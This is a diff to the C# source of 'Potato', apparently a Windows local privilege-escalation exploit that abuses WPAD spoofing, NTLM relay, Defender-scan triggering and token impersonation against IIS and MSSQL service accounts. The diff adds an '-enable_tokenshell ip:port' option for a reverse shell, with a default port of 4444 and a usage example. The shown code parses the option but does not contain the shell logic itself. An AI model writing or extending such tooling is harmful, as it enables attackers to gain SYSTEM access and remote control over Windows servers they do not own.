@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Threading;
 using System.Net;
@@ -34,6 +34,10 @@ namespace Potato
         }
         //
         public static int sleep_time = 300000; // 5min_sleep is default
+
+        public static string rev_ip = "";
+
+        public static int rev_port = 4444;
     }
     //
     public class Program
@@ -57,7 +61,7 @@ namespace Potato
             Console.WriteLine("-spoof_host <default wpad> \n-spoof_address <default, localip> \n-wpad_exclude <comma separated host to exclude>");
             Console.WriteLine("-schedule_task <true/false, Win10 only> \n-srv_port <port for webserver to listen, default 80>");
             Console.WriteLine("-enable_httpserver <true/false> \n-enable_defender_scan <true/false> \n-enable_etw <true/false> [guid][StandAlone]");
-            Console.WriteLine("-enable_token <true/false> [needs http or dcom] \n-enable_dce <true/false> \n");
+            Console.WriteLine("-enable_token <true/false> [needs http or dcom] \n-enable_dce <true/false> \n-enable_tokenshell <ip:port>\n");
         }
         //
         static int Main(string[] args) 
@@ -65,8 +69,8 @@ namespace Potato
             Dictionary<string, string> argDict = parseArgs(args);
             String cmd = "\"C:\\Windows\\System32\\cmd.exe\" /K start";
             String ip = null, drop_first = null, enable_httpserver = null, spoof_address = null, 
-                enable_dce = null, enable_exhaust = null, enable_spoof = null, enable_defender = null, 
-                enable_defender_scan = null, schedule_task = null, spoof_host = "WPAD", enable_etw = null, enable_token = null;
+                enable_dce = null, enable_exhaust = null, enable_spoof = null, enable_defender = null,
+                enable_defender_scan = null, schedule_task = null, spoof_host = "WPAD", enable_etw = null, enable_token = null, enable_tokenshell = null;
             String wpad_exclude_str="live.sysinternals.com";
             int srvPort = 80;
             if (argDict.ContainsKey("ip")) ip = argDict["ip"];
@@ -85,6 +89,7 @@ namespace Potato
             if (argDict.ContainsKey("spoof_address")) spoof_address = argDict["spoof_address"]; else spoof_address = "127.0.0.1";
             if (argDict.ContainsKey("drop_first_dcom")) drop_first = argDict["drop_first_dcom"];
             if (argDict.ContainsKey("enable_token")) enable_token = argDict["enable_token"];
+            if (argDict.ContainsKey("enable_tokenshell")) enable_tokenshell = argDict["enable_tokenshell"];
             ;
             //
             if (args.Length > 0)
@@ -99,8 +104,8 @@ namespace Potato
                     Console.WriteLine("\nExample Windows 10:\nPotato.exe -ip <ip> -cmd \"ping 127.0.0.1\" -enable_httpserver true -enable_defender_scan true");
                     Console.WriteLine("\nExample Enable WebClient:\nPotato.exe -enable_etw true\nPotato.exe -enable_etw 22b6d684-fa63-4578-87c9-effcbe6643c7");
                     Console.WriteLine("\nExample IIS/MSSQL/*:\nPotato.exe -enable_token true -enable_dce true");
+                    Console.WriteLine("\nExample IIS/MSSQL/*:\nPotato.exe -enable_token true -enable_dce true -enable_tokenshell 127.0.0.1:4444");
                     Console.WriteLine("Potato.exe -enable_token true -enable_httpserver true -enable_defender_scan true -srv_port 9595");
-                    Console.WriteLine("Potato.exe");
                     Environment.Exit(0);
                 }
             }
@@ -119,6 +124,20 @@ namespace Potato
             if (enable_etw != null)
             {
                 EventTriggers.start_service(enable_etw);
+            }
+            //
+            if (enable_tokenshell != null)
+            {
+                try
+                {
+                    V.rev_ip = enable_tokenshell.Split(':')[0];
+                    V.rev_port = Int32.Parse(enable_tokenshell.Split(':')[1]);
+                }
+                catch
+                {
+                    Console.WriteLine("Proper IP:Port needed.");
+                    Environment.Exit(0);
+                }
             }
             //
             String[] wpad_exclude = wpad_exclude_str.Split(',');
@@ -213,3 +232,4 @@ namespace Potato
         }
     }
 }
+
